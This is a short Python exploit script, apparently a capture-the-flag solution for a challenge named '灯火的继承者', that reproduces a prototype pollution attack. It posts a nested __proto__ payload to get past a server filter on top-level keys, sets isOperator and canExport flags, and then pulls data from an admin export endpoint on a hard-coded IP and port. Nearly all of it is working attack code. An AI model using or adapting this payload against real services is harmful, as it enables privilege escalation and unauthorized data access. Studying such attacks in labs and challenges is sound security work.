# -*- coding: utf-8 -*-
"""灯火的继承者 — 原型链污染复现脚本
用法: python solve_proto.py http://IP:PORT
"""
import json
import sys
import urllib.request
import urllib.error

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33699"


def req(path, data=None, method=None):
    body = json.dumps(data).encode() if data is not None else None
    h = {"Content-Type": "application/json"} if body else {}
    r = urllib.request.Request(BASE + path, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


print("[0] 基线:", req("/api/admin/export")[1].replace("\n", " "))

# 1) 顶层 __proto__ —— 被服务端过滤
print("[1] 顶层:", req("/api/scene", {"__proto__": {"isOperator": True, "canExport": True}}, "POST")[1].replace("\n", " "))

# 2) 嵌套一层绕过：房间对象里塞 __proto__
print("[2] 嵌套:", req("/api/scene", {"livingRoom": {"__proto__": {"isOperator": True, "canExport": True}}}, "POST")[1].replace("\n", " "))

# 3) 复查探针
print("[3] scene:", req("/api/scene")[1].replace("\n", " "))

# 4) 导出审核数据
s, b = req("/api/admin/export")
print("[4] export:", s, b)
